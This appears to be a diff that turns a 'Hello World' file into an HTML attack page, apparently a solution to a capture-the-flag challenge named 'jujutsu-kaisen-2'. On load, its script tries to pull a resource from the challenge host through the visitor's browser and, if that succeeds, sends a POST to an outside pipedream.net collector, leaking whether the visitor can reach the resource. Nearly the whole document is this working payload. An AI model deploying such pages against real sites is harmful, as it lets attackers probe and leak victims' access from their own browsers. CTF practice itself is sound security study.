@@ -1,1 +1,36 @@
-Hello World
+<!DOCTYPE html>
+<html>
+
+<body>
+    <!-- http://172.19.0.4:9080/characters -->
+
+    <script type="text/javascript">
+        function check() {
+            const script = document.createElement('script');
+            script.src = `https://jujutsu-kaisen-2.ctf.maplebacon.org//characters`;
+            script.onload = () => {
+                console.log(`User can access`);
+                const headers = new Headers();
+                headers.append("Content-Type", "application/json");
+
+                const body = {
+                    "test": "event"
+                };
+
+                const options = {
+                    method: "POST",
+                    headers,
+                    mode: "cors",
+                    body: JSON.stringify(body),
+                };
+
+                fetch("https://eopipiplmv9k7nt.m.pipedream.net", options);
+            };
+            document.body.appendChild(script);
+        }
+        check();
+    </script>
+
+</body>
+
+</html>
